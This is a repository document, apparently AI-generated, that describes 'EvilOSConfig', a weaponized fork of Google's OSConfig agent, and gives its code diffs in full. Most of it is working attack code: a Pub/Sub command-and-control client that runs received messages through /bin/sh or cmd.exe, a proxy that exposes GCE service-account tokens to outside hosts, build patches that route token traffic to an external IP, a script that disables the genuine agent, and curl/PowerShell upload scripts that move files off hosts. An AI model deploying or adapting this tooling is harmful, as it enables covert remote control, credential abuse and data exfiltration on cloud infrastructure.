# EvilOSConfig vs OSConfig — Differences

> Yes, this is all AI-generated. But the overall code differences and the changes we've made using AI was really well documented, so decided to leave this in the repo.  - choi 

## Base Version

EvilOSConfig was forked from the official [Google OSConfig Agent](https://github.com/GoogleCloudPlatform/osconfig) at:

- **Commit:** `0961d6ac0227` 
- **Date:** 2026-06-03

---

## A) High-Level Functional Differences

### 1. Registration &amp; Service Model

- Original runs as a proper Windows service via `golang.org/x/sys/windows/svc` with full lifecycle management (start/stop/interrogate)
- EvilOSConfig removes the `service` struct and `Execute()` method entirely
- `runService()` now directly calls `run(ctx)`, bypassing Windows Service Manager
- Enables deployment as a dropped standalone binary without service installation

### 2. Metadata Proxy &amp; Remote Token Fetching

- Introduces `metadata-proxy.py` — an HTTP proxy running on a GCE e2-micro instance
- Forwards requests to the real metadata server at `169.254.169.254`
- Exposes on `0.0.0.0:8080` with basic auth (`evilosconfig:evilosconfig` / base64: `ZXZpbG9zY29uZmlnOmV2aWxvc2NvbmZpZw==`)
- Controller's `bake` command patches `agentconfig.go` to hardcode the proxy address
- Also patches `IDToken()` to use `getMetadata()` instead of the `metadata` library's `Get()` (which has its own host resolution)
- Allows the agent to operate on non-GCE hosts while authenticating via a real GCE instance's service account
- `metadata-proxy.sh` deploys the proxy and disables the legitimate osconfig agent on the proxy host

### 3. Pub/Sub Command-and-Control Channel

- New `pubsubc2` package — compiled conditionally with `-tags pubsub` build tag
- Agent subscribes to `evilosconfig-cmd-sub` Pub/Sub subscription
- Executes received messages as shell commands (`/bin/sh -c` on Linux, `cmd.exe /c` on Windows)
- Publishes command output to `evilosconfig-output` topic with hostname attribution
- Toggled at runtime via instance metadata key `enable-pubsub=true`
- Token acquisition uses the metadata server (or proxy) — no embedded credentials
- Controller provides `enable-pubsub` (idempotent infrastructure/IAM setup plus activation), `disable-pubsub`, and `pubsub-console` commands

### 4. OS Policy Command Execution &amp; File Transfer

- Controller (`evilosconfig-controller.py`) weaponizes Google's OS Policy Assignment API
- `runcmd`: Creates ephemeral OS Policies with `ExecResource` blocks to run arbitrary shell/PowerShell
- Polls the assignment report API for stdout/stderr output, then auto-deletes the policy
- `upload`: Generates Cloud Storage pre-signed PUT URLs, deploys OS Policy that `curl --upload-file` or `Invoke-WebRequest -Method Put`
- `download`: Same pattern with GET signed URLs for file retrieval to/from the agent host
- Supports both `--target local` (controller host) and `--target agent` (remote via OS Policy)
- Cross-platform: uses `inventoryFilters` to dispatch Linux shell vs Windows PowerShell scripts

### 5. Polling &amp; Responsiveness Tuning

- `osConfigPollIntervalDefault`: 10 minutes → 1 minute
- `osConfigMetadataPollTimeout`: 60 seconds → 10 seconds
- Makes the agent respond to metadata changes (e.g., enabling Pub/Sub) within ~1 minute instead of ~10
- Tradeoff: more frequent metadata requests, slightly higher network footprint

---

## B) Modified Files Table


| File                                 | Lines Changed        | Functional Difference                                                                 |
| ------------------------------------ | -------------------- | ------------------------------------------------------------------------------------- |
| `main.go:38`                         | +1 (import)          | Adds `pubsubc2` package import                                                        |
| `main.go:199`                        | +1 (var decl)        | Declares `pubsubClient *pubsubc2.Client` variable                                     |
| `main.go:226-239`                    | +16 (logic)          | Pub/Sub C2 toggle in `runTaskLoop` — starts/stops subscriber based on metadata flag   |
| `main_windows.go:31`                 | -1 (import)          | Removes `golang.org/x/sys/windows/svc` import                                         |
| `main_windows.go:97-130`             | -36 (removed)        | Removes entire Windows `service` struct and `Execute()` method                        |
| `main_windows.go:97-99`              | +2 (replacement)     | `runService()` now directly calls `run(ctx)` instead of `svc.Run()`                   |
| `agentconfig/agentconfig.go:83-84`   | 2 (modified)         | `osConfigPollIntervalDefault`: 10→1, `osConfigMetadataPollTimeout`: 60→10             |
| `agentconfig/agentconfig.go:144`     | +1 (field)           | Adds `pubsubEnabled bool` field to `config` struct                                    |
| `agentconfig/agentconfig.go:239`     | +1 (field)           | Adds `EnablePubSub` JSON tag to `attributesJSON` struct                               |
| `agentconfig/agentconfig.go:376-381` | +6 (logic)           | Parses `enable-pubsub` metadata attribute into config                                 |
| `agentconfig/agentconfig.go:688-697` | +10 (exported funcs) | Adds `PubSubEnabled()` and `GetMetadata()` exported functions                         |
| `pubsubc2/pubsubc2.go:1-118`         | +118 (new file)      | Full Pub/Sub C2 client — subscribes to commands, executes via shell, publishes output |
| `pubsubc2/pubsubc2_stub.go:1-22`     | +22 (new file)       | No-op stub for builds without `pubsub` tag                                            |
| `evilosconfig-controller.py:1-1127`  | +1127 (new file)     | Full controller: bake, compile, runcmd, upload, download, pubsub management           |
| `metadata-proxy.py:1-51`             | +51 (new file)       | HTTP metadata proxy with basic auth                                                   |
| `metadata-proxy.sh:1-53`             | +53 (new file)       | Deployment script — stops real osconfig agent, installs and starts proxy              |
| `.env.json.example:1-10`             | +10 (new file)       | Config template for controller (signer SA, project, bucket, zone)                     |
| `.github/dependabot.yml`             | -10 (removed)        | Removed Dependabot configuration                                                      |
| `.github/workflows/codeql.yml`       | -92 (removed)        | Removed CodeQL analysis workflow                                                      |
| `.gitignore`                         | rewritten            | Now ignores compiled binaries, osconfig subdir, .env.json, temp policy files          |


---

## C) Raw Code Diffs

### 1. main.go — Pub/Sub C2 integration

```diff
--- a/main.go
+++ b/main.go
@@ -35,6 +35,7 @@ import (
 	"github.com/GoogleCloudPlatform/osconfig/agentendpoint"
 	"github.com/GoogleCloudPlatform/osconfig/clog"
 	"github.com/GoogleCloudPlatform/osconfig/policies"
+	"github.com/GoogleCloudPlatform/osconfig/pubsubc2"
 	"github.com/GoogleCloudPlatform/osconfig/tasker"
 	"github.com/GoogleCloudPlatform/osconfig/util"
 	"github.com/tarm/serial"
@@ -195,6 +196,7 @@ func run(ctx context.Context) {
 
 func runTaskLoop(ctx context.Context, c chan struct{}) {
 	var taskNotificationClient *agentendpoint.Client
+	var pubsubClient *pubsubc2.Client
 	var err error
 	for {
@@ -221,6 +223,21 @@ func runTaskLoop(ctx context.Context, c chan struct{}) {
 		}
 
+		// Pub/Sub C2 toggle.
+		if agentconfig.PubSubEnabled() && pubsubClient == nil {
+			pubsubClient, err = pubsubc2.Start(ctx)
+			if err != nil {
+				clog.Errorf(ctx, "pubsub: %v", err)
+				pubsubClient = nil
+			} else {
+				clog.Infof(ctx, "pubsub: channel started")
+			}
+		} else if !agentconfig.PubSubEnabled() && pubsubClient != nil {
+			pubsubClient.Stop()
+			pubsubClient = nil
+			clog.Infof(ctx, "pubsub: channel stopped")
+		}
+
 		// This is just to signal WaitForTaskNotification has run if needed.
 		select {
```

### 2. main_windows.go — Windows service removal

```diff
--- a/main_windows.go
+++ b/main_windows.go
@@ -28,7 +28,6 @@ import (
 	"github.com/GoogleCloudPlatform/osconfig/agentconfig"
 	"github.com/GoogleCloudPlatform/osconfig/packages"
 	"golang.org/x/sys/windows"
-	"golang.org/x/sys/windows/svc"
 )
 
@@ -95,44 +94,8 @@ func obtainLock() {
 	deferredFuncs = append(deferredFuncs, func() { ... })
 }
 
-type service struct {
-	ctx context.Context
-	run func(context.Context)
-}
-
-func (s *service) Execute(_ []string, r <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {
-	status <- svc.Status{State: svc.StartPending}
-	ctx, cncl := context.WithCancel(s.ctx)
-	defer cncl()
-	done := make(chan struct{})
-
-	go func() {
-		s.run(ctx)
-		close(done)
-	}()
-	status <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
-
-	for {
-		select {
-		case <-done:
-			status <- svc.Status{State: svc.StopPending}
-			return false, 0
-		case c := <-r:
-			switch c.Cmd {
-			case svc.Interrogate:
-				status <- c.CurrentStatus
-			case svc.Stop, svc.Shutdown:
-				cncl()
-			default:
-			}
-		}
-	}
-}
-
 func runService(ctx context.Context) {
-	if err := svc.Run(serviceName, &service{run: run, ctx: ctx}); err != nil {
-		logger.Fatalf("svc.Run error: %v", err)
-	}
+	run(ctx)
 }
```

### 3. agentconfig/agentconfig.go — Poll tuning, Pub/Sub config, metadata export

```diff
--- a/agentconfig/agentconfig.go
+++ b/agentconfig/agentconfig.go
@@ -80,8 +80,8 @@ const (
 	restartFileLinux    = cacheDirLinux + "/osconfig_agent_restart_required"
 	oldRestartFileLinux = oldConfigDirLinux + "/osconfig_agent_restart_required"
 
-	osConfigPollIntervalDefault = 10
-	osConfigMetadataPollTimeout = 60
+	osConfigPollIntervalDefault = 1
+	osConfigMetadataPollTimeout = 10
 
 	// Default Google API domain
 	universeDomainDefault = "googleapis.com"
@@ -141,6 +141,7 @@ type config struct {
 	scalibrLinuxEnabled     bool
 	guestAttributesEnabled  bool
 	traceGetInventory       bool
+	pubsubEnabled           bool
 }
 
@@ -235,6 +236,7 @@ type attributesJSON struct {
 	EnableGuestAttributes string       `json:"enable-guest-attributes"`
 	TraceGetInventory     string       `json:"trace-get-inventory"`
 	ScalibrLinuxEnabled   string       `json:"enable-scalibr-linux"`
+	EnablePubSub         string       `json:"enable-pubsub"`
 }
 
@@ -371,6 +373,13 @@ func createConfigFromMetadata(md metadataJSON) *config {
 		c.debugEnabled = true
 	}
 
+	if md.Project.Attributes.EnablePubSub != "" {
+		c.pubsubEnabled = parseBool(md.Project.Attributes.EnablePubSub)
+	}
+	if md.Instance.Attributes.EnablePubSub != "" {
+		c.pubsubEnabled = parseBool(md.Instance.Attributes.EnablePubSub)
+	}
+
 	setScalibrEnablement(md, c)
 	setSVCEndpoint(md, c)
 	setTraceGetInventory(md, c)
@@ -676,6 +685,16 @@ func TaskNotificationEnabled() bool {
 	return getAgentConfig().taskNotificationEnabled
 }
 
+// PubSubEnabled indicates whether the Pub/Sub C2 channel should be enabled.
+func PubSubEnabled() bool {
+	return getAgentConfig().pubsubEnabled
+}
+
+// GetMetadata fetches a value from the metadata server (exported for pubsubc2).
+func GetMetadata(suffix string) ([]byte, string, error) {
+	return getMetadata(suffix)
+}
+
 // Instance is the URI of the instance the agent is running on.
 func Instance() string {
```

### 4. pubsubc2/pubsubc2.go — Full Pub/Sub C2 client (new file)

```go
//go:build pubsub

package pubsubc2

import (
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"runtime"
	"time"

	"cloud.google.com/go/pubsub"
	"github.com/GoogleCloudPlatform/osconfig/agentconfig"
	"golang.org/x/oauth2"
	"google.golang.org/api/option"
)

const (
	cmdSubscription = "evilosconfig-cmd-sub"
	outputTopicName = "evilosconfig-output"
)

type metadataTokenSource struct{}

func (s *metadataTokenSource) Token() (*oauth2.Token, error) {
	data, _, err := agentconfig.GetMetadata("instance/service-accounts/default/token")
	if err != nil {
		return nil, fmt.Errorf("metadata token fetch: %w", err)
	}
	var resp struct {
		AccessToken string `json:"access_token"`
		ExpiresIn   int    `json:"expires_in"`
		TokenType   string `json:"token_type"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, fmt.Errorf("metadata token parse: %w", err)
	}
	return &oauth2.Token{
		AccessToken: resp.AccessToken,
		TokenType:   resp.TokenType,
		Expiry:      time.Now().Add(time.Duration(resp.ExpiresIn) * time.Second),
	}, nil
}

// Client manages the Pub/Sub C2 streaming channel.
type Client struct {
	client *pubsub.Client
	cancel context.CancelFunc
	done   chan struct{}
}

// Available reports whether pubsub support was compiled in.
func Available() bool { return true }

// Start creates a Pub/Sub client and begins listening for commands.
func Start(ctx context.Context) (*Client, error) {
	projectID := agentconfig.ProjectID()
	if projectID == "" {
		return nil, fmt.Errorf("pubsub: empty project ID")
	}

	ts := oauth2.ReuseTokenSource(nil, &metadataTokenSource{})
	psClient, err := pubsub.NewClient(ctx, projectID, option.WithTokenSource(ts))
	if err != nil {
		return nil, fmt.Errorf("pubsub client: %w", err)
	}

	subCtx, cancel := context.WithCancel(ctx)
	c := &Client{
		client: psClient,
		cancel: cancel,
		done:   make(chan struct{}),
	}
	go c.subscribe(subCtx)
	return c, nil
}

func (c *Client) subscribe(ctx context.Context) {
	defer close(c.done)
	sub := c.client.Subscription(cmdSubscription)
	topic := c.client.Topic(outputTopicName)
	defer topic.Stop()

	sub.Receive(ctx, func(ctx context.Context, msg *pubsub.Message) {
		cmd := string(msg.Data)
		out := executeCommand(ctx, cmd)

		topic.Publish(ctx, &pubsub.Message{
			Data: out,
			Attributes: map[string]string{
				"hostname": agentconfig.Name(),
			},
		})
		msg.Ack()
	})
}

// Stop shuts down the Pub/Sub subscriber and closes the client.
func (c *Client) Stop() {
	c.cancel()
	<-c.done
	c.client.Close()
}

func executeCommand(ctx context.Context, command string) []byte {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", command)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return append(out, []byte("\n[exit: "+err.Error()+"]")...)
	}
	return out
}
```

### 5. pubsubc2/pubsubc2_stub.go — No-op stub (new file)

```go
//go:build !pubsub

package pubsubc2

import (
	"context"
	"fmt"
)

// Client is a no-op stub when compiled without pubsub support.
type Client struct{}

// Available reports whether pubsub support was compiled in.
func Available() bool { return false }

// Start returns an error when pubsub is not compiled in.
func Start(ctx context.Context) (*Client, error) {
	return nil, fmt.Errorf("pubsub: not compiled with -tags pubsub")
}

// Stop is a no-op.
func (c *Client) Stop() {}
```

### 6. metadata-proxy.py — Metadata proxy server (new file)

```python
#!/usr/bin/env python3
"""
Metadata proxy — runs on a GCE e2-micro instance.
Forwards requests to the real GCE metadata server (169.254.169.254).
Exposes it on 0.0.0.0:8080 so the remote osconfig agent can fetch tokens.
"""

import base64
import http.server
import urllib.request
import sys

METADATA_HOST = "169.254.169.254"
LISTEN_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
EXPECTED_AUTH = "Basic " + base64.b64encode(b"evilosconfig:evilosconfig").decode()


class MetadataProxy(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.headers.get("Authorization") != EXPECTED_AUTH:
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="metadata-proxy"')
            self.end_headers()
            return

        url = f"http://{METADATA_HOST}{self.path}"
        req = urllib.request.Request(url)
        req.add_header("Metadata-Flavor", "Google")

        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read()
                self.send_response(resp.status)
                for key, val in resp.getheaders():
                    if key.lower() not in ("transfer-encoding", "connection"):
                        self.send_header(key, val)
                self.end_headers()
                self.wfile.write(body)
        except Exception as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(str(e).encode())

    def log_message(self, fmt, *args):
        print(f"[proxy] {args[0]}")


if __name__ == "__main__":
    server = http.server.HTTPServer(("0.0.0.0", LISTEN_PORT), MetadataProxy)
    print(f"Metadata proxy listening on 0.0.0.0:{LISTEN_PORT}")
    server.serve_forever()
```

### 7. metadata-proxy.sh — Proxy deployment script (new file)

```bash
#!/bin/bash
systemctl stop google-osconfig-agent
systemctl disable google-osconfig-agent

cat > /opt/metadata-proxy.py << 'PYEOF'
#!/usr/bin/env python3
import base64
import http.server
import urllib.request
import sys

METADATA_HOST = "169.254.169.254"
LISTEN_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
EXPECTED_AUTH = "Basic " + base64.b64encode(b"evilosconfig:evilosconfig").decode()


class MetadataProxy(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.headers.get("Authorization") != EXPECTED_AUTH:
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="metadata-proxy"')
            self.end_headers()
            return

        url = f"http://{METADATA_HOST}{self.path}"
        req = urllib.request.Request(url)
        req.add_header("Metadata-Flavor", "Google")

        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read()
                self.send_response(resp.status)
                for key, val in resp.getheaders():
                    if key.lower() not in ("transfer-encoding", "connection"):
                        self.send_header(key, val)
                self.end_headers()
                self.wfile.write(body)
        except Exception as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(str(e).encode())

    def log_message(self, fmt, *args):
        print(f"[proxy] {args[0]}")


if __name__ == "__main__":
    server = http.server.HTTPServer(("0.0.0.0", LISTEN_PORT), MetadataProxy)
    print(f"Metadata proxy listening on 0.0.0.0:{LISTEN_PORT}")
    server.serve_forever()
PYEOF

nohup python3 -u /opt/metadata-proxy.py > /var/log/metadata-proxy.log 2>&1 &
```

### 8. Build-Time Source Patching ("Bake") — Transient Differences

The `bake` command applies source patches to `agentconfig/agentconfig.go` before compilation, then reverts them after the binary is built. These changes do not appear in git history but represent a critical functional difference in the compiled binary.

**Controller side** (`evilosconfig-controller.py:162-214`):

```python
def cmd_bake(args):
    proxy_addr = args.proxy_host

    # Patch 1: getMetadata() — hardcode host
    old_pattern = r'host := os\.Getenv\(metadataHostEnv\)'
    content = re.sub(old_pattern, f'host := "{proxy_addr}" // BAKED', content)

    # Patch 2: Add auth header to getMetadata() for proxy basic auth
    auth_line = '\treq.Header.Add("Authorization", "Basic ZXZpbG9zY29uZmlnOmV2aWxvc2NvbmZpZw==") // BAKED'
    content = content.replace(
        'req.Header.Add("Metadata-Flavor", "Google")',
        'req.Header.Add("Metadata-Flavor", "Google")\n' + auth_line,
    )

    # Patch 3: IDToken() — replace metadata.Get() with our getMetadata()
    old_idtoken = r'data, err := metadata\.Get\(IdentityTokenPath\)'
    new_idtoken = f'raw, _, err := getMetadata(IdentityTokenPath)\n\tdata := string(raw) // BAKED'
    content = re.sub(old_idtoken, new_idtoken, content)
    # Comment out the now-unused metadata import
    content = re.sub(
        r'\t"cloud\.google\.com/go/compute/metadata"\n',
        '\t// "cloud.google.com/go/compute/metadata" // BAKED\n',
        content
    )
```

**Target code** — original `agentconfig/agentconfig.go:449-466` (what gets patched):

```go
func getMetadata(suffix string) ([]byte, string, error) {
	host := os.Getenv(metadataHostEnv)       // ← Patch 1 replaces this line
	if host == "" {
		host = metadataIP                    // "169.254.169.254"
	}
	computeMetadataURL := "http://" + host + "/computeMetadata/v1/" + suffix
	req, err := http.NewRequest("GET", computeMetadataURL, nil)
	if err != nil {
		return nil, "", err
	}
	req.Header.Add("Metadata-Flavor", "Google")  // ← Patch 2 adds auth header after this
	resp, err := defaultClient.Do(req)
	// ...
}
```

**Target code** — original `agentconfig/agentconfig.go:741-742` (IDToken):

```go
func (t *idToken) get() error {
	data, err := metadata.Get(IdentityTokenPath)  // ← Patch 3 replaces this
	// ...
}
```

**After bake** — the compiled binary behaves as if `agentconfig.go` contains:

```go
func getMetadata(suffix string) ([]byte, string, error) {
	host := "34.56.78.90:8080" // BAKED
	if host == "" {
		host = metadataIP
	}
	computeMetadataURL := "http://" + host + "/computeMetadata/v1/" + suffix
	req, err := http.NewRequest("GET", computeMetadataURL, nil)
	if err != nil {
		return nil, "", err
	}
	req.Header.Add("Metadata-Flavor", "Google")
	req.Header.Add("Authorization", "Basic ZXZpbG9zY29uZmlnOmV2aWxvc2NvbmZpZw==") // BAKED
	resp, err := defaultClient.Do(req)
	// ...
}

func (t *idToken) get() error {
	raw, _, err := getMetadata(IdentityTokenPath)
	data := string(raw) // BAKED
	// ...
}
```

These patches redirect all metadata/token traffic from `169.254.169.254` (GCE-local) to an external proxy, authenticated with hardcoded Basic auth credentials.

### 9. evilosconfig-controller.py — Cloud Storage file transfer (new file, relevant excerpt)

File transfer requires no agent code changes — it reuses the stock ExecResource engine. The controller generates a pre-signed URL, then deploys an ephemeral OS Policy whose enforce script runs `curl` (Linux) or `Invoke-WebRequest` (Windows) against it. The agent executes it like any other policy.

```python
# ── evilosconfig-controller.py:676-690 — Signed URL generation ───────
# Impersonates a service account from .env.json to create a short-lived
# (default 3m) signed URL scoped to a single HTTP verb (PUT or GET).

def create_signed_url(gs_uri, duration, http_verb, config):
    signer = get_signer_service_account(config)
    result = subprocess.run([
        "gcloud", "storage", "sign-url", gs_uri,
        f"--duration={duration}",
        f"--http-verb={http_verb}",
        f"--impersonate-service-account={signer}",
    ], capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"failed to create signed URL: {result.stderr.strip()}")
    url_match = re.search(r'https?://\S+', result.stdout)
    if url_match:
        return url_match.group(0)
    raise RuntimeError(f"failed to parse signed URL from gcloud output: {result.stdout.strip()}")


# ── evilosconfig-controller.py:764-779 — Transfer policy construction ─
# Wraps platform-specific curl/Invoke-WebRequest scripts into a single
# OS Policy with inventoryFilters, so GCP delivers the right script per OS.
# The agent's existing ExecResource handler runs it — no agent changes needed.

LINUX_OUTPUT_FILE = "/tmp/evilosconfig-transfer.out"                    # :411
WINDOWS_OUTPUT_FILE = r"C:\Windows\Temp\evilosconfig-transfer.out"      # :412


# ── evilosconfig-controller.py:714-761 — Platform transfer scripts ────
# These generate the inline shell scripts that get embedded into the
# OS Policy's ExecResource enforce block. The agent downloads and runs
# them via /bin/sh (Linux) or PowerShell (Windows) — the actual file
# transfer is just curl or Invoke-WebRequest against the signed URL.

def build_linux_upload_script(source_file, signed_url):               # :714
    return textwrap.dedent(f"""\
        set -eu
        src={shlex.quote(source_file)}
        url={shlex.quote(signed_url)}
        curl -fsS -X PUT --upload-file "$src" "$url"
        printf '%s\\n' "uploaded $src" > {shlex.quote(LINUX_OUTPUT_FILE)}
        exit 100
    """)

def build_linux_download_script(signed_url, destination, obj_base):   # :736
    return textwrap.dedent(f"""\
        set -eu
        dst={shlex.quote(destination)}
        url={shlex.quote(signed_url)}
        case "$dst" in
          */) dst="${{dst}}{obj_base}" ;;
        esac
        curl -fsS -L -o "$dst" "$url"
        printf '%s\\n' "downloaded $dst" > {shlex.quote(LINUX_OUTPUT_FILE)}
        exit 100
    """)

def build_windows_upload_script(source_file, signed_url):             # :725
    return textwrap.dedent(f"""\
        $ErrorActionPreference = 'Stop'
        $src = {ps_quote(source_file)}
        $uri = {ps_quote(signed_url)}
        Invoke-WebRequest -Method Put -InFile $src -Uri $uri -UseBasicParsing | Out-Null
        "uploaded $src" | Out-File -FilePath {ps_quote(WINDOWS_OUTPUT_FILE)} -Encoding utf8
        exit 100
    """)

def build_windows_download_script(signed_url, destination, obj_base): # :750
    return textwrap.dedent(f"""\
        $ErrorActionPreference = 'Stop'
        $dst = {ps_quote(destination)}
        $uri = {ps_quote(signed_url)}
        if ($dst.EndsWith('\\') -or $dst.EndsWith('/')) {{
          $dst = $dst + {ps_quote(obj_base)}
        }}
        Invoke-WebRequest -Method Get -Uri $uri -OutFile $dst -UseBasicParsing
        "downloaded $dst" | Out-File -FilePath {ps_quote(WINDOWS_OUTPUT_FILE)} -Encoding utf8
        exit 100
    """)


# ── evilosconfig-controller.py:764-779 — Transfer policy construction ─
# Wraps the above scripts into a single OS Policy with inventoryFilters,
# so GCP delivers the right script per OS. The agent's existing
# ExecResource handler runs it — no agent changes needed.

def transfer_policy(policy_id, linux_script, windows_script):
    resource_groups = [
			{
				"inventoryFilters": [{"osShortName": name} for name in LINUX_OS_SHORT_NAMES],
				"resources": [
						exec_resource("linux-transfer", "SHELL", linux_script, LINUX_OUTPUT_FILE),
				],
			},
			{
				"inventoryFilters": [{"osShortName": "windows"}],
				"resources": [
						exec_resource("windows-transfer", "POWERSHELL", windows_script, WINDOWS_OUTPUT_FILE),
				],
			},
    ]
    return os_policy_assignment(policy_id, resource_groups)
```

